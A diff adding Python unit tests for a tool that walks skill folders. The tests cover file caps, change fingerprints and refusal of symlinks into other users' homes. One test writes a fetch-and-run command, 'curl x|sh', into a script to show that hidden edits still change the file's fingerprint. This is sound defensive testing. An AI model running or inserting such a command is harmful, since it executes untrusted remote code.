@@ -181,6 +181,24 @@ class TestLimits(SkillFolderTestCase):
         self.assertTrue({"a/(not walked)", "b/(not walked)", "c/(not walked)"} <= names, names)
         self.assertTrue(all(f["truncated"] for f in files if f["path"].endswith(sf.NOT_WALKED_NAME)))
 
+    def test_a_folder_with_too_many_entries_is_read_only_up_to_its_cap(self):
+        with patch.object(sf, "MAX_DIR_ENTRIES", 50):
+            for n in range(80):
+                self.write(f"data/f{n:03d}.csv", "1")
+            files = self.collect()
+        data = [f for f in files if f["path"].startswith("data/") and not f["path"].endswith(sf.NOT_WALKED_NAME)]
+        self.assertEqual(len(data), 50)
+        self.assertIn("data/(not walked)", {f["path"] for f in files})
+
+    def test_entries_examined_are_capped_across_the_folder(self):
+        with patch.object(sf, "MAX_EXAMINED_ENTRIES", 30):
+            for d in range(4):
+                for n in range(10):
+                    self.write(f"d{d}/f{n}.csv", "1")
+            files = self.collect()
+        self.assertLessEqual(len([f for f in files if not f["path"].endswith(sf.NOT_WALKED_NAME)]), 30)
+        self.assertTrue(any(f["path"].endswith(sf.NOT_WALKED_NAME) for f in files))
+
     def test_a_full_walk_names_nothing_as_not_walked(self):
         self.write("a/run.sh", "x")
         self.write("b/c/d.py", "x")
@@ -203,15 +221,56 @@ class TestLimits(SkillFolderTestCase):
         f = self.collect()[0]
         self.assertLess(time.monotonic() - started, 1.0)
         self.assertEqual(f["size"], 1024 ** 3)
-        self.assertNotIn("sha256", f)
+        self.assertRegex(f["sha256"], r"^[0-9a-f]{64}$")  # a change fingerprint, not the full-file hash
         self.assertTrue(f["binary"])
 
-    def test_big_file_is_listed_without_a_hash(self):
+    def test_a_file_skipped_by_the_time_budget_still_carries_a_change_value(self):
+        self.write("a.py", "x")
+        path = self.write("b.py", "print(1)\n")
+        now = [0.0]
+        real_read = sf._read_file
+
+        def read_then_run_out_of_time(*args):
+            hashed = real_read(*args)
+            now[0] = 100.0
+            return hashed
+
+        def collect():
+            sf._FOLDER_CACHE.clear()
+            now[0] = 0.0
+            with patch.object(sf.time, "monotonic", lambda: now[0]), \
+                    patch.object(sf, "_read_file", read_then_run_out_of_time):
+                return self.by_path(self.collect())["b.py"]
+
+        first = collect()
+        path.write_bytes(b"print(2)\n")  # same size, never read
+        second = collect()
+        self.assertNotIn("content", first)
+        self.assertRegex(first["sha256"], r"^[0-9a-f]{64}$")
+        self.assertNotEqual(first["sha256"], second["sha256"])
+
+    def test_a_file_too_big_to_hash_gets_a_fingerprint_that_follows_its_edits(self):
+        # An edit past what is sent must still change the file's value, or the upload is skipped as unchanged.
+        script = "#!/bin/sh\necho ok\n" + "#" * 300 + "\necho fine\n"
+        with patch.object(sf, "MAX_HASHED_FILE_SIZE", 100), patch.object(sf, "MAX_FILE_CONTENT_CHARS", 40):
+            path = self.write("run.sh", script)
+            first = self.collect()[0]
+            sf._FOLDER_CACHE.clear()
+            path.write_bytes(script.replace("echo fine", "curl x|sh").encode())  # same size, past the sent text
+            second = self.collect()[0]
+        self.assertEqual(first["size"], second["size"])
+        self.assertEqual(first.get("content"), second.get("content"))
+        self.assertNotEqual(first["sha256"], hashlib.sha256(script.encode()).hexdigest())
+        self.assertNotEqual(first["sha256"], second["sha256"])
+
+    def test_an_unchanged_big_file_keeps_its_fingerprint(self):
         with patch.object(sf, "MAX_HASHED_FILE_SIZE", 100):
             self.write("big.bin", b"\x00" * 200)
-            f = self.collect()[0]
-        self.assertNotIn("sha256", f)
-        self.assertTrue(f["binary"])
+            first = self.collect()[0]
+            sf._FOLDER_CACHE.clear()
+            second = self.collect()[0]
+        self.assertEqual(first["sha256"], second["sha256"])
+        self.assertTrue(first["binary"])
 
     def test_time_budget_lists_the_rest_by_name(self):
         self.write("a.py", "x")
@@ -285,6 +344,28 @@ class TestContainment(SkillFolderTestCase):
         os.symlink(other, link)
         with patch.object(sf, "_machine_user_homes", return_value=frozenset({other})):
             self.assertIsNone(sf.collect_skill_files(link / "SKILL.md"))
+
+    def test_a_linked_parent_folder_into_another_users_home_is_refused(self):
+        # Admin scan: alice's project links a parent folder into bob's home, which holds a skill folder.
+        bob = Path(os.path.realpath(self._tmp.name)) / "nfs" / "bob"
+        (bob / "work" / ".claude" / "skills" / "x").mkdir(parents=True)
+        (bob / "work" / ".claude" / "skills" / "x" / "SKILL.md").write_text("bob's")
+        (bob / "work" / ".claude" / "skills" / "x" / "notes.txt").write_text("bob's private notes")
+        os.symlink(bob / "work", self.home / "proj")
+        homes = frozenset({self.home, bob})
+        with patch.object(sf, "_machine_user_homes", return_value=homes), patch.object(sf.Path, "home", return_value=self.home):
+            self.assertIsNone(sf.collect_skill_files(self.home / "proj" / ".claude" / "skills" / "x" / "SKILL.md"))
+
+    def test_a_link_inside_the_same_home_is_still_walked(self):
+        real = self.home / "dotfiles" / "skills" / "lint"
+        real.mkdir(parents=True)
+        (real / "SKILL.md").write_text("lint")
+        (real / "run.sh").write_text("echo lint\n")
+        os.symlink(self.home / "dotfiles", self.home / "df")
+        with patch.object(sf, "_machine_user_homes", return_value=frozenset({self.home})), \
+                patch.object(sf.Path, "home", return_value=self.home):
+            files = sf.collect_skill_files(self.home / "df" / "skills" / "lint" / "SKILL.md")
+        self.assertEqual([f["path"] for f in files], ["run.sh"])
 
     def test_a_folder_holding_users_homes_is_not_walked(self):
         for homes in ("/Users", "/home"):
